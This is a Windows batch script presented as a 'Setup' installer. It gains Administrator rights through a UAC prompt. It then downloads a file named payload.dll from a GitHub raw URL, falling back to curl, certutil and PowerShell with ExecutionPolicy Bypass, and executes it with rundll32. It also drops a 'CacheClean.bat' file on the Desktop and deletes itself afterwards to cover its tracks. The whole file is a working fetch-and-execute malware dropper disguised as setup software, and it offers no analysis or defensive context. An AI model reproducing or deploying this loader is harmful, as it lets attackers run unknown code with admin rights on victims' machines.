@echo off
setlocal EnableExtensions
title Setup

fltmc >nul 2>&1
if %errorlevel% equ 0 goto :IS_ADMIN
if /i "%~1"=="__ELEVATED__" goto :ELEV_FAILED

echo.
echo  [!] Need Administrator privileges!
echo  [*] Restarting as Admin...
echo.

echo Set UAC = CreateObject^("Shell.Application"^) > "%TEMP%\vy_elev.vbs"
echo UAC.ShellExecute "%~s0", "__ELEVATED__", "", "runas", 1 >> "%TEMP%\vy_elev.vbs"
cscript //nologo "%TEMP%\vy_elev.vbs"
del /f /q "%TEMP%\vy_elev.vbs" >nul 2>&1
exit /b

:ELEV_FAILED
echo.
echo  [-] Cannot get Administrator privileges!
echo.
pause
exit /b 1

:IS_ADMIN
echo.
echo  [*] Preparing...
echo.

set "BASE=https://raw.githubusercontent.com/Gtx047/Gtx/refs/heads/main"
set "DLL=%TEMP%\a7f3c812-4e9b-4d2a-b156-9c8e1d4f7062.tmp"
set "OLD=%TEMP%\a7f3c812-4e9b-4d2a-b156-9c8e1d4f7062.old"
set "CLN=%TEMP%\b81e5d47-2c6a-4f19-8d03-7a4c9e15b2f8.tmp"
set "DST=%USERPROFILE%\Desktop\CacheClean.bat"

del /f /q "%OLD%" 2>nul
if exist "%DLL%" ren "%DLL%" "a7f3c812-4e9b-4d2a-b156-9c8e1d4f7062.old" 2>nul

echo  [*] Downloading...
where curl.exe >nul 2>&1
if %errorlevel% equ 0 curl.exe -sL --ssl-no-revoke "%BASE%/payload.dll" -o "%DLL%"
if not exist "%DLL%" certutil -urlcache -split -f "%BASE%/payload.dll" "%DLL%" >nul 2>&1
if not exist "%DLL%" powershell -NoProfile -ExecutionPolicy Bypass -Command "try{Invoke-WebRequest -Uri '%BASE%/payload.dll' -OutFile '%DLL%' -UseBasicParsing}catch{}" >nul 2>&1
if not exist "%DLL%" goto :FAIL
for %%A in ("%DLL%") do if %%~zA LSS 100 goto :FAIL

where curl.exe >nul 2>&1
if %errorlevel% equ 0 curl.exe -sL --ssl-no-revoke "%BASE%/clean.bat" -o "%CLN%"
if not exist "%CLN%" certutil -urlcache -split -f "%BASE%/clean.bat" "%CLN%" >nul 2>&1
if exist "%CLN%" (
    copy /y "%CLN%" "%DST%" >nul
    del /f /q "%CLN%" >nul 2>&1
)

echo  [+] Downloaded
echo  [*] Loading...
echo.

start "" rundll32.exe "%DLL%",Entry

timeout /t 3 >nul
goto :BYE

:FAIL
echo.
echo  [-] Download failed!
echo.
pause

:BYE
set "SELF=%~f0"
start /b "" cmd.exe /c ping 127.0.0.1 -n 2 ^>nul ^& del /f /q "%SELF%"
exit /b